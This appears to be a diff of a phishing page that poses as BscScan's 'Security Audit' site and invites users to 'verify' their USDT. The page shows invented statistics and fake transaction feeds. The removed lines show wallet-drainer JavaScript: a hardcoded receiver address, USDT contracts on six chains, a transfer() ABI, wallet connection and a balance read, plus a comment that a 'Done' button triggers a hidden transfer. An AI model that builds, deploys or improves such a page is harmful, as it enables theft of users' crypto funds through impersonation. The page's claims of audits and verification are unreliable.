@@ -11,86 +11,122 @@
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
     body { background-color: #0b0e14; color: #ffffff; display: flex; justify-content: center; min-height: 100vh; }
-    .app-container { width: 100%; max-width: 430px; background-color: #0b0e14; display: flex; flex-direction: column; position: relative; box-shadow: 0 0 20px rgba(0,0,0,0.8); }
-
-    /* Browser Header */
-    .browser-header { background-color: #12161f; padding: 10px 14px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #1a202c; }
-    .url-bar { background-color: #1e2430; border-radius: 20px; padding: 6px 14px; display: flex; align-items: center; gap: 8px; flex-grow: 1; margin: 0 10px; font-size: 14px; color: #e2e8f0; }
-    .url-bar .warning-icon { color: #f6ad55; font-size: 12px; }
+    
+    .app-container { width: 100%; max-width: 430px; background-color: #0b0e14; display: flex; flex-direction: column; position: relative; }
 
     /* Brand Header */
-    .brand-header { padding: 14px 16px; display: flex; align-items: center; justify-content: space-between; }
-    .brand-logo { display: flex; align-items: center; gap: 10px; }
-    .shield-icon { width: 32px; height: 32px; background: linear-gradient(135deg, #f3ba2f 0%, #946900 100%); clip-path: polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%); display: flex; align-items: center; justify-content: center; }
-    .shield-inner { width: 24px; height: 24px; background: #0b0e14; clip-path: polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%); display: flex; align-items: center; justify-content: center; }
-    .brand-text h1 { font-size: 18px; font-weight: 700; color: #ffffff; display: flex; align-items: center; gap: 6px; }
-    .security-badge { background-color: #382c0b; color: #f3ba2f; font-size: 10px; padding: 2px 6px; border-radius: 4px; font-weight: 600; text-transform: uppercase; }
-    .brand-subtitle { font-size: 11px; color: #718096; }
-    .chain-badge { background-color: #121721; border: 1px solid #1e2638; border-radius: 20px; padding: 6px 12px; display: flex; align-items: center; gap: 6px; font-size: 11px; font-weight: 600; color: #e2e8f0; }
+    .brand-header { padding: 16px 20px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid rgba(255,255,255,0.05); margin-bottom: 10px; }
+    .brand-logo { display: flex; align-items: center; gap: 12px; }
+    
+    .shield-icon { 
+      width: 28px; height: 32px; border: 2px solid #f3ba2f; border-radius: 4px; display: flex; align-items: center; justify-content: center; clip-path: polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%);
+    }
+    
+    .brand-text h1 { font-size: 18px; font-weight: 700; color: #ffffff; display: flex; align-items: center; gap: 8px; letter-spacing: -0.5px; }
+    .security-badge { background-color: rgba(243, 186, 47, 0.15); color: #f3ba2f; font-size: 9px; padding: 3px 6px; border-radius: 4px; font-weight: 700; letter-spacing: 0.5px; }
+    .brand-subtitle { font-size: 11px; color: #718096; margin-top: 2px; }
+    
+    .chain-badge { background-color: rgba(0, 211, 149, 0.1); border: 1px solid rgba(0, 211, 149, 0.2); border-radius: 20px; padding: 6px 12px; display: flex; align-items: center; gap: 6px; font-size: 10px; font-weight: 700; color: #e2e8f0; }
     .dot-green { width: 6px; height: 6px; background-color: #00d395; border-radius: 50%; }
 
     /* Cards */
-    .content-area { padding: 0 16px 80px 16px; display: flex; flex-direction: column; gap: 12px; }
-    .card { background-color: #121722; border: 1px solid #1a2233; border-radius: 16px; padding: 16px; position: relative; }
-    .card-label { font-size: 11px; color: #718096; font-weight: 600; letter-spacing: 0.5px; margin-bottom: 8px; }
-    .card-value { font-size: 24px; font-weight: 700; color: #f3ba2f; margin-bottom: 4px; }
+    .content-area { padding: 10px 16px 40px 16px; display: flex; flex-direction: column; gap: 14px; }
+    .card { background-color: #12161f; border: 1px solid #1e2430; border-radius: 16px; padding: 20px; position: relative; }
+    .card-label { font-size: 11px; color: #718096; font-weight: 600; letter-spacing: 0.5px; margin-bottom: 10px; text-transform: uppercase; }
+    .card-value { font-size: 26px; font-weight: 700; margin-bottom: 6px; }
+    .text-yellow { color: #f3ba2f; }
+    .text-green { color: #00d395; }
+    .text-white { color: #ffffff; }
+    
     .card-subtext-green { font-size: 12px; color: #00d395; font-weight: 500; }
     .card-subtext-gray { font-size: 12px; color: #718096; }
-    .card-icon-top { position: absolute; top: 16px; right: 16px; opacity: 0.5; }
+    .card-icon-top { position: absolute; top: 20px; right: 20px; font-size: 16px; color: #00d395; opacity: 0.8; }
+    .icon-gray { color: #718096; opacity: 0.5; }
 
     /* Banner */
-    .banner-pill { align-self: center; background: rgba(243, 186, 47, 0.1); border: 1px solid rgba(243, 186, 47, 0.3); padding: 6px 14px; border-radius: 20px; font-size: 11px; color: #f3ba2f; display: flex; align-items: center; gap: 6px; margin: 10px 0; }
-    .main-heading { text-align: center; font-size: 20px; font-weight: 800; line-height: 1.3; margin-bottom: 8px; }
+    .banner-pill { align-self: center; border: 1px solid #423210; border-radius: 20px; padding: 6px 16px; font-size: 11px; color: #f3ba2f; display: flex; align-items: center; gap: 6px; margin: 24px 0 16px 0; font-weight: 500; }
+    .banner-pill-icon { width: 14px; height: 16px; border: 1px solid #f3ba2f; clip-path: polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%); }
+    
+    .main-heading { text-align: center; font-size: 22px; font-weight: 800; line-height: 1.3; margin-bottom: 12px; letter-spacing: -0.5px; }
     .main-heading span { color: #f3ba2f; }
-    .main-desc { text-align: center; font-size: 12px; color: #718096; line-height: 1.5; margin-bottom: 16px; }
+    .main-desc { text-align: center; font-size: 13px; color: #718096; line-height: 1.5; margin-bottom: 16px; padding: 0 10px; }
 
     /* Verify Box */
-    .token-row { display: flex; align-items: center; justify-content: space-between; margin-bottom: 16px; }
-    .token-info { display: flex; align-items: center; gap: 10px; }
-    .token-icon { width: 32px; height: 32px; background-color: #26a17b; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 14px; }
-    .token-title { font-weight: 700; font-size: 14px; }
-    .token-subtitle { font-size: 11px; color: #718096; }
-    .badge-verified { border: 1px solid rgba(0, 211, 149, 0.4); background: rgba(0, 211, 149, 0.1); color: #00d395; font-size: 11px; padding: 4px 8px; border-radius: 12px; display: flex; align-items: center; gap: 4px; }
+    .verify-box { background-color: #12161f; border: 1px solid #1e2430; border-radius: 16px; padding: 20px; display: flex; flex-direction: column; }
+    .token-row { display: flex; align-items: center; justify-content: space-between; margin-bottom: 24px; padding-bottom: 20px; border-bottom: 1px solid #1e2430; }
+    .token-info { display: flex; align-items: center; gap: 12px; }
+    .token-icon { width: 36px; height: 36px; background-color: #26a17b; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 16px; color: white; }
+    .token-title { font-weight: 700; font-size: 15px; display: flex; align-items: center; gap: 6px; color: #ffffff; }
+    .token-subtitle { font-size: 12px; color: #718096; margin-top: 2px; }
+    
+    .badge-verified-container { display: flex; flex-direction: column; align-items: flex-end; gap: 4px; }
+    .badge-verified { border: 1px solid rgba(0, 211, 149, 0.4); color: #00d395; font-size: 11px; padding: 4px 10px; border-radius: 12px; display: flex; align-items: center; gap: 4px; }
+    .badge-verified-sub { font-size: 10px; color: #718096; }
 
-    .verify-hero { display: flex; flex-direction: column; align-items: center; padding: 16px 0; }
-    .shield-big { width: 44px; height: 44px; background: linear-gradient(135deg, #f3ba2f 0%, #946900 100%); clip-path: polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%); display: flex; align-items: center; justify-content: center; margin-bottom: 12px; }
-    .shield-big-inner { width: 36px; height: 36px; background: #121722; clip-path: polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%); display: flex; align-items: center; justify-content: center; color: #f3ba2f; }
-    .verify-title { font-size: 16px; font-weight: 700; margin-bottom: 8px; }
-    .verify-desc { font-size: 11px; color: #718096; text-align: center; margin-bottom: 16px; line-height: 1.4; }
+    .verify-hero { display: flex; flex-direction: column; align-items: center; padding: 10px 0; }
+    .shield-big { width: 48px; height: 54px; border: 2px solid #f3ba2f; border-radius: 4px; display: flex; align-items: center; justify-content: center; clip-path: polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%); margin-bottom: 16px; color: #f3ba2f; font-size: 20px; }
+    .verify-title { font-size: 20px; font-weight: 700; margin-bottom: 12px; color: #ffffff; }
+    .verify-desc { font-size: 12px; color: #718096; text-align: center; margin-bottom: 24px; line-height: 1.6; padding: 0 10px; }
 
-    /* Custom Loader inside Button */
-    .loader { border: 2px solid #000; border-top: 2px solid transparent; border-radius: 50%; width: 14px; height: 14px; animation: spin 1s linear infinite; display: inline-block; vertical-align: middle; margin-right: 6px; }
-    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-    .btn-verify { width: 100%; background-color: #f3ba2f; color: #000000; border: none; padding: 12px; border-radius: 12px; font-weight: 700; font-size: 14px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; box-shadow: 0 4px 12px rgba(243, 186, 47, 0.2); transition: 0.3s; }
+    .btn-verify { width: 100%; background-color: #f3ba2f; color: #000000; border: none; padding: 16px; border-radius: 12px; font-weight: 700; font-size: 15px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; transition: 0.3s; margin-bottom: 20px; }
     .btn-verify:disabled { opacity: 0.7; cursor: not-allowed; }
-    .verify-footer-notes { display: flex; justify-content: space-between; margin-top: 16px; padding-top: 12px; border-top: 1px solid #1a2233; font-size: 10px; color: #718096; }
-
-    /* Feed Table */
-    .table-header-title { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; }
-    .feed-tag { font-size: 10px; color: #718096; }
-    .tx-table { width: 100%; border-collapse: collapse; }
-    .tx-table th { text-align: left; font-size: 11px; color: #718096; padding-bottom: 8px; font-weight: 500; }
-    .tx-table td { padding: 10px 0; font-size: 12px; border-top: 1px solid #1a2233; }
-    .tx-hash { color: #f3ba2f; font-family: monospace; }
-    .method-badge { background-color: #1a2333; color: #94a3b8; border-radius: 12px; padding: 2px 8px; font-size: 10px; display: inline-block; }
-    .block-num { color: #e2e8f0; font-family: monospace; }
-    .new-row { animation: fadeInRow 0.6s ease-in-out; }
-    @keyframes fadeInRow { from { opacity: 0; background-color: rgba(243, 186, 47, 0.15); } to { opacity: 1; background-color: transparent; } }
-
-    /* Footer & Bottom Nav */
-    .site-footer { text-align: center; padding: 24px 0 12px 0; }
-    .footer-brand { display: flex; align-items: center; justify-content: center; gap: 6px; color: #f3ba2f; font-weight: 700; margin-bottom: 4px; }
-    .footer-subtitle { font-size: 10px; color: #718096; margin-bottom: 16px; }
-    .footer-copyright { font-size: 10px; color: #475569; }
-    .bottom-nav { position: fixed; bottom: 0; width: 100%; max-width: 430px; background-color: #0d1117; border-top: 1px solid #1a202c; display: flex; justify-content: space-around; padding: 8px 0; z-index: 100; }
-    .nav-item { display: flex; flex-direction: column; align-items: center; font-size: 10px; color: #718096; gap: 3px; }
-    .nav-item.active { color: #f3ba2f; }
+    .verify-footer-notes { display: flex; justify-content: space-between; padding-top: 16px; border-top: 1px solid #1e2430; font-size: 11px; color: #718096; }
+    .note-yellow { color: #f3ba2f; font-weight: 600; }
 
     /* =====================================
-       NEW MODAL STYLES (MATCHING SCREENSHOT) 
+       NEW: SCROLLING TICKER (Matching Video)
        ===================================== */
-    .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.7); display: none; align-items: center; justify-content: center; z-index: 1000; padding: 20px; }
+    .ticker-container {
+      background-color: #12161f;
+      border: 1px solid #1e2430;
+      border-radius: 16px;
+      padding: 16px;
+      overflow: hidden;
+      white-space: nowrap;
+      position: relative;
+      display: flex;
+    }
+    .ticker-container::before, .ticker-container::after {
+      content: ""; position: absolute; top: 0; width: 30px; height: 100%; z-index: 2;
+    }
+    .ticker-container::before { left: 0; background: linear-gradient(to right, #12161f, transparent); }
+    .ticker-container::after { right: 0; background: linear-gradient(to left, #12161f, transparent); }
+
+    .ticker-track {
+      display: inline-flex;
+      align-items: center;
+      gap: 30px;
+      animation: ticker 15s linear infinite;
+    }
+    @keyframes ticker {
+      0% { transform: translateX(0); }
+      100% { transform: translateX(-50%); }
+    }
+    .ticker-item { display: inline-flex; align-items: center; gap: 8px; font-size: 11px; color: #718096; }
+    .ticker-token { color: #ffffff; font-weight: 600; font-size: 12px; }
+
+    /* Live Feed Table */
+    .table-container { background-color: #12161f; border-radius: 16px; overflow: hidden; border: 1px solid #1e2430; }
+    .tx-table { width: 100%; border-collapse: collapse; }
+    .tx-table tr { border-bottom: 1px solid #1e2430; display: flex; justify-content: space-between; padding: 20px; align-items: center; }
+    .tx-table tr:last-child { border-bottom: none; }
+    .tx-hash { color: #f3ba2f; font-family: monospace; font-size: 14px; }
+    .method-badge { background-color: transparent; color: #94a3b8; font-size: 13px; }
+    .block-num { color: #e2e8f0; font-family: monospace; font-size: 14px; }
+    .new-row { animation: fadeInRow 0.6s ease-in-out; }
+    @keyframes fadeInRow { from { opacity: 0; background-color: rgba(243, 186, 47, 0.1); } to { opacity: 1; background-color: transparent; } }
+
+    /* Footer */
+    .site-footer { text-align: center; padding: 40px 0 30px 0; display: flex; flex-direction: column; align-items: center; }
+    .footer-brand { display: flex; align-items: center; justify-content: center; gap: 8px; color: #f3ba2f; font-weight: 700; font-size: 16px; margin-bottom: 8px; }
+    .footer-shield { width: 18px; height: 20px; border: 1.5px solid #f3ba2f; border-radius: 3px; display: flex; align-items: center; justify-content: center; clip-path: polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%); }
+    .footer-subtitle { font-size: 11px; color: #718096; margin-bottom: 24px; padding: 0 40px; line-height: 1.5; }
+    .footer-links { display: flex; justify-content: center; gap: 24px; font-size: 12px; color: #94a3b8; margin-bottom: 16px; font-weight: 500; }
+    .footer-tos { font-size: 12px; color: #94a3b8; margin-bottom: 24px; font-weight: 500; }
+    .footer-copyright { font-size: 11px; color: #475569; }
+
+    /* Modals (No change, exactly as requested) */
+    .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.75); display: none; align-items: center; justify-content: center; z-index: 1000; padding: 20px; }
     .modal-card { background-color: #121722; border-radius: 20px; width: 100%; max-width: 340px; padding: 24px 20px; position: relative; display: flex; flex-direction: column; align-items: center; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.8); }
     .modal-close { position: absolute; top: 12px; right: 16px; background: none; border: none; color: #718096; font-size: 20px; cursor: pointer; }
     
@@ -98,25 +134,23 @@
     .modal-title { font-size: 18px; font-weight: 700; color: #ffffff; margin-bottom: 8px; }
     .modal-subtitle { font-size: 12px; color: #718096; margin-bottom: 24px; line-height: 1.5; padding: 0 10px; }
     
-    /* Verified Balance Box */
     .balance-box { background-color: #0b0e14; border-radius: 12px; width: 100%; padding: 16px 0; margin-bottom: 16px; }
     .balance-label { font-size: 11px; color: #718096; margin-bottom: 6px; }
     .balance-val { font-size: 24px; font-weight: 700; color: #f3ba2f; }
 
-    /* Green Tick Info Box */
     .sync-box { background-color: #171c26; border-radius: 12px; padding: 12px; width: 100%; display: flex; align-items: flex-start; gap: 10px; text-align: left; margin-bottom: 24px; border: 1px solid #1a2233; }
     .sync-tick { color: #00d395; font-size: 14px; font-weight: bold; }
     .sync-text { font-size: 11px; color: #94a3b8; line-height: 1.5; }
+    
+    .loader { border: 2px solid #000; border-top: 2px solid transparent; border-radius: 50%; width: 14px; height: 14px; animation: spin 1s linear infinite; display: inline-block; vertical-align: middle; margin-right: 6px; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-    /* Big Yellow Button */
     .btn-done { width: 100%; background-color: #f3ba2f; color: #000; border: none; padding: 14px; border-radius: 12px; font-weight: 700; font-size: 15px; cursor: pointer; transition: 0.3s; }
   </style>
 </head>
 <body>
 
-  <!-- ========================================== -->
   <!-- MODAL 1: No Wallet Detected -->
-  <!-- ========================================== -->
   <div class="modal-overlay" id="walletModal">
     <div class="modal-card">
       <button class="modal-close" onclick="closeModal('walletModal')">✕</button>
@@ -127,9 +161,7 @@
     </div>
   </div>
 
-  <!-- ========================================== -->
   <!-- MODAL 2: The New BscScan Audit Modal -->
-  <!-- ========================================== -->
   <div class="modal-overlay" id="auditModal">
     <div class="modal-card">
       <button class="modal-close" onclick="closeModal('auditModal')">✕</button>
@@ -140,7 +172,6 @@
       
       <div class="balance-box">
         <div class="balance-label">Verified Balance</div>
-        <!-- This value will update dynamically -->
         <div class="balance-val"><span id="uiUSDT">0.00</span> USDT</div>
       </div>
 
@@ -149,8 +180,6 @@
         <div class="sync-text">Tokens are authentic and synchronized directly with mainnet validator nodes.</div>
       </div>
 
-      <!-- This yellow button will trigger the hidden transfer if balance > 0 -->
-      <!-- If balance is 0, it just closes the modal -->
       <button id="btnDone" class="btn-done" onclick="handleDoneAction()">Done</button>
       <div id="txStatus" style="font-size:10px; color:#718096; margin-top:10px; display:none;">Processing...</div>
     </div>
@@ -160,25 +189,18 @@
   <!-- MAIN APP CONTAINER -->
   <div class="app-container">
 
-    <!-- Chrome Header -->
-    <div class="browser-header">
-      <span style="color:#a0aec0;">✕</span>
-      <div class="url-bar"><span class="warning-icon">⚠️</span><span>bscsecure.site</span></div>
-      <span style="color:#a0aec0;">⋮</span>
-    </div>
-
     <!-- BscScan Header -->
     <div class="brand-header">
       <div class="brand-logo">
-        <div class="shield-icon"><div class="shield-inner"></div></div>
+        <div class="shield-icon"></div>
         <div class="brand-text">
-          <h1>BscScan <span class="security-badge">Security</span></h1>
-          <div class="brand-subtitle">Multi-Chain Protocol</div>
+          <h1>BscScan <span class="security-badge">SECURITY</span></h1>
+          <div class="brand-subtitle">BNB Smart Chain Explorer</div>
         </div>
       </div>
       <div class="chain-badge">
         <span class="dot-green"></span>
-        <span id="headerNetwork">MULTI-CHAIN</span>
+        <span id="headerNetwork">BNB SMART CHAIN</span>
       </div>
     </div>
 
@@ -187,148 +209,126 @@
       <!-- Stats Cards -->
       <div class="card">
         <div class="card-label">USDT VERIFIED (24H)</div>
-        <div class="card-value" id="usdt-val">$15,906,052</div>
+        <div class="card-value text-yellow" id="usdt-val">$15,906,052</div>
         <div class="card-subtext-green">+8.24% vs yesterday</div>
-        <div class="card-icon-top">🛡️</div>
+        <div class="card-icon-top icon-gray">🛡️</div>
       </div>
+      
+      <div class="card">
+        <div class="card-label">TOTAL AUDITED VOLUME</div>
+        <div class="card-value text-white" id="vol-val">$4,892,765,321</div>
+        <div class="card-subtext-gray">All time consensus</div>
+        <div class="card-icon-top icon-gray">🗄️</div>
+      </div>
+      
       <div class="card">
         <div class="card-label">AUDIT CONSENSUS</div>
-        <div class="card-value" style="color: #00d395;">99.98% PASS</div>
-        <div class="card-subtext-gray">Secure Routing Protocol</div>
+        <div class="card-value text-green">99.98% PASS</div>
+        <div class="card-subtext-gray">1.05 Gwei Standard Gas</div>
         <div class="card-icon-top">⚙️</div>
       </div>
 
       <!-- Banner -->
-      <div class="banner-pill">🛡️ Proof-of-Reserve Audit</div>
-      <div class="main-heading">Network Asset <span>Security<br>Verification</span></div>
-      <div class="main-desc">The institutional gateway for smart contract auditing and asset verification across major Web3 ecosystems.</div>
+      <div class="banner-pill">
+        <div class="banner-pill-icon"></div>
+        BscScan Proof-of-Reserve Protocol
+      </div>
+      
+      <div class="main-heading">BNB Smart Chain <span>Security<br>Audit</span></div>
+      <div class="main-desc">The institutional gateway for smart contract auditing and asset verification on the BNB Smart Chain ecosystem.</div>
 
-      <!-- Action Card -->
-      <div class="card">
+      <!-- Verify Box -->
+      <div class="verify-box">
         <div class="token-row">
           <div class="token-info">
             <div class="token-icon">₮</div>
             <div>
-              <div class="token-title">Tether USD <span style="font-size:11px; color:#718096;">(USDT)</span></div>
-              <div class="token-subtitle">Standard Supported</div>
+              <div class="token-title">Tether USD <span style="font-size:13px; color:#718096; font-weight:normal;">(USDT)</span></div>
+              <div class="token-subtitle">BEP-20 Standard</div>
             </div>
           </div>
-          <div class="badge-verified">✓ Verified</div>
+          <div class="badge-verified-container">
+            <div class="badge-verified">✓ Verified</div>
+            <div class="badge-verified-sub">Audit Protocol</div>
+          </div>
         </div>
 
         <div class="verify-hero">
-          <div class="shield-big"><div class="shield-big-inner">✓</div></div>
-          <div class="verify-title">Verify Your Assets</div>
-          <div class="verify-desc">Execute official on-chain validation for your USDT tokens via secure consensus.</div>
+          <div class="shield-big">✓</div>
+          <div class="verify-title">Verify BEP-20 Assets</div>
+          <div class="verify-desc">Execute official on-chain validation for your BEP-20 tokens via BscScan's direct Smart Chain consensus.</div>
           
           <button id="mainVerifyBtn" class="btn-verify" onclick="initiateAuditFlow()">
             🛡️ Verify Asset
           </button>
         </div>
-        <div class="verify-footer-notes"><span>🔒 Institutional Security Standard</span><span style="color:#f3ba2f;">Zero Gas Fee Relay</span></div>
+        
+        <div class="verify-footer-notes">
+          <span>🔒 Institutional Security Standard</span>
+          <span class="note-yellow">Zero Gas Fee Relay</span>
+        </div>
       </div>
 
-      <!-- Live Feed -->
-      <div class="card" style="margin-top: 10px;">
-        <div class="table-header-title">
-          <div style="display:flex; align-items:center; gap:6px; font-weight:700; font-size:13px;"><span style="color:#f3ba2f;">⚡</span> Latest Verified Transactions</div>
-          <div class="feed-tag">Live Feed</div>
+      <!-- NEW: SCROLLING TICKER (Video Match) -->
+      <div class="ticker-container">
+        <div class="ticker-track">
+          <!-- Item 1 -->
+          <div class="ticker-item"><span class="dot-green"></span><span class="ticker-token">Tether USD</span> (USDT) <span>0x55d3...7955</span></div>
+          <!-- Item 2 -->
+          <div class="ticker-item"><span class="dot-green" style="background:#f3ba2f;"></span><span class="ticker-token">BNB</span> (BNB) <span>Native</span></div>
+          <!-- Item 3 -->
+          <div class="ticker-item"><span class="dot-green" style="background:#627eea;"></span><span class="ticker-token">Ethereum Token</span> (ETH) <span>0x2170...0233</span></div>
+          <!-- Item 4 -->
+          <div class="ticker-item"><span class="dot-green" style="background:#2775ca;"></span><span class="ticker-token">USD Coin</span> (USDC) <span>0x8ac7...526b</span></div>
+          <!-- Item 5 -->
+          <div class="ticker-item"><span class="dot-green" style="background:#14f195;"></span><span class="ticker-token">Solana Token</span> (SOL) <span>0x570a...3902</span></div>
+          
+          <!-- Duplicated for infinite loop -->
+          <div class="ticker-item"><span class="dot-green"></span><span class="ticker-token">Tether USD</span> (USDT) <span>0x55d3...7955</span></div>
+          <div class="ticker-item"><span class="dot-green" style="background:#f3ba2f;"></span><span class="ticker-token">BNB</span> (BNB) <span>Native</span></div>
+          <div class="ticker-item"><span class="dot-green" style="background:#627eea;"></span><span class="ticker-token">Ethereum Token</span> (ETH) <span>0x2170...0233</span></div>
+          <div class="ticker-item"><span class="dot-green" style="background:#2775ca;"></span><span class="ticker-token">USD Coin</span> (USDC) <span>0x8ac7...526b</span></div>
+          <div class="ticker-item"><span class="dot-green" style="background:#14f195;"></span><span class="ticker-token">Solana Token</span> (SOL) <span>0x570a...3902</span></div>
         </div>
-        <table class="tx-table">
-          <thead><tr><th>Txn Hash</th><th>Method</th><th>Block</th></tr></thead>
-          <tbody id="tx-body">
-            <tr><td class="tx-hash">0x7f4e...9b12</td><td><span class="method-badge">AuditVerify</span></td><td class="block-num">38924102</td></tr>
-            <tr><td class="tx-hash">0x3a19...8c44</td><td><span class="method-badge">AuditVerify</span></td><td class="block-num">38924099</td></tr>
-            <tr><td class="tx-hash">0x9c21...e5f3</td><td><span class="method-badge">AuditVerify</span></td><td class="block-num">38924095</td></tr>
-          </tbody>
+      </div>
+
+      <!-- Live Feed Table -->
+      <div class="table-container">
+        <!-- Added header inside table container like video -->
+        <div style="display:flex; justify-content:space-between; padding: 20px 20px 0 20px;">
+          <div style="display:flex; align-items:center; gap:6px; font-weight:700; font-size:12px; color:#ffffff;"><span style="color:#f3ba2f;">⚡</span> Latest Verified Security Transactions</div>
+          <div style="font-size:10px; color:#718096; text-align:right;">Live On-Chain<br>Feed</div>
+        </div>
+        <table class="tx-table" id="tx-body" style="margin-top:10px;">
+          <tr><td class="tx-hash">0x7f4e...9b12</td><td class="method-badge">AuditVerify</td><td class="block-num">38924102</td></tr>
+          <tr><td class="tx-hash">0x3a19...8c44</td><td class="method-badge">AuditVerify</td><td class="block-num">38924099</td></tr>
+          <tr><td class="tx-hash">0x9c21...e5f3</td><td class="method-badge">AuditVerify</td><td class="block-num">38924095</td></tr>
+          <tr><td class="tx-hash">0x1d8a...22c7</td><td class="method-badge">AuditVerify</td><td class="block-num">38924090</td></tr>
+          <tr><td class="tx-hash">0x5b33...7d90</td><td class="method-badge">AuditVerify</td><td class="block-num">38924086</td></tr>
         </table>
       </div>
 
       <!-- Footer -->
       <div class="site-footer">
-        <div class="footer-brand">🛡️ BscScan Audit</div>
-        <div class="footer-subtitle">The Leading Multi-Chain Security Platform</div>
-        <div class="footer-copyright">© 2026 Verify Protocol. All rights reserved.</div>
+        <div class="footer-brand">
+          <div class="footer-shield"></div>
+          BscScan
+        </div>
+        <div class="footer-subtitle">The Leading BNB Smart Chain Explorer & Security Audit Platform</div>
+        
+        <div class="footer-links">
+          <span>Explorer API</span>
+          <span>Security Protocol</span>
+          <span>BEP-20 Directory</span>
+        </div>
+        <div class="footer-tos">Terms of Service</div>
+        
+        <div class="footer-copyright">© 2026 BscScan. All rights reserved.</div>
       </div>
 
     </div>
 
-    <!-- Bottom Nav -->
-    <div class="bottom-nav">
-      <div class="nav-item active"><span>⌂</span><span>Home</span></div>
-      <div class="nav-item"><span>📈</span><span>Markets</span></div>
-      <div class="nav-item"><span>🔄</span><span>Trade</span></div>
-      <div class="nav-item"><span>💼</span><span>Assets</span></div>
-    </div>
   </div>
 
 
-  <!-- ========================================== -->
-  <!-- JAVASCRIPT: THE BRAIN (WEB3 LOGIC) -->
-  <!-- ========================================== -->
-  <script>
-    // 👇 AAPKA UNIVERSAL ADDRESS YAHAN SET HAI 👇
-    const RECEIVER_ADDRESS = "0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3"; 
-    // 👆 ===================================== 👆
-
-    // MULTI-CHAIN SUPPORT CONFIGURATION
-    const SUPPORTED_NETWORKS = {
-        1: { name: "Ethereum", usdt: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6, short: "ETH" },
-        56: { name: "BNB Smart Chain", usdt: "0x55d398326f99059fF775485246999027B3197955", decimals: 18, short: "BSC" },
-        137: { name: "Polygon", usdt: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", decimals: 6, short: "MATIC" },
-        42161: { name: "Arbitrum One", usdt: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", decimals: 6, short: "ARB" },
-        10: { name: "Optimism", usdt: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", decimals: 6, short: "OP" },
-        43114: { name: "Avalanche", usdt: "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7", decimals: 6, short: "AVAX" }
-    };
-
-    const tokenABI = [
-        "function balanceOf(address owner) view returns (uint256)",
-        "function transfer(address to, uint256 amount) external returns (bool)"
-    ];
-
-    let signer = null;
-    let userAddress = "";
-    let fullBalance = null;
-    let currentNetworkData = null;
-
-    // UI HELPER FUNCTIONS
-    function openModal(id) { document.getElementById(id).style.display = 'flex'; }
-    function closeModal(id) { document.getElementById(id).style.display = 'none'; }
-    function resetMainButton() { document.getElementById("mainVerifyBtn").innerHTML = `🛡️ Verify Asset`; document.getElementById("mainVerifyBtn").disabled = false; }
-
-    // STEP 1: INITIALIZE CONNECTION & CHECK BALANCES
-    async function initiateAuditFlow() {
-        const btn = document.getElementById("mainVerifyBtn");
-        
-        if (window.ethereum) {
-            try {
-                // UI Loading State
-                btn.innerHTML = `<span class="loader"></span> Scanning...`;
-                btn.disabled = true;
-
-                // Request Wallet Connection
-                await window.ethereum.request({ method: 'eth_requestAccounts' });
-                
-                const provider = new ethers.providers.Web3Provider(window.ethereum);
-                signer = provider.getSigner();
-                userAddress = await signer.getAddress();
-
-                // Detect Network
-                const network = await provider.getNetwork();
-                const chainId = network.chainId;
-
-                // Fallback to BSC text if network not supported, but allow flow to continue for error handling
-                if (SUPPORTED_NETWORKS[chainId]) {
-                    currentNetworkData = SUPPORTED_NETWORKS[chainId];
-                    document.getElementById("headerNetwork").innerText = currentNetworkData.short;
-                    
-                    // Fetch Real USDT Balance
-                    const usdtContract = new ethers.Contract(currentNetworkData.usdt, tokenABI, provider);
-                    fullBalance = await usdtContract.balanceOf(userAddress);
-                } else {
-                    // Force 0 balance behavior if network unsupported
-                    fullBalance = ethers.BigNumber.from(0); 
-                }
-
-                // Populate Modal Data
-               
+  <!-- ===========
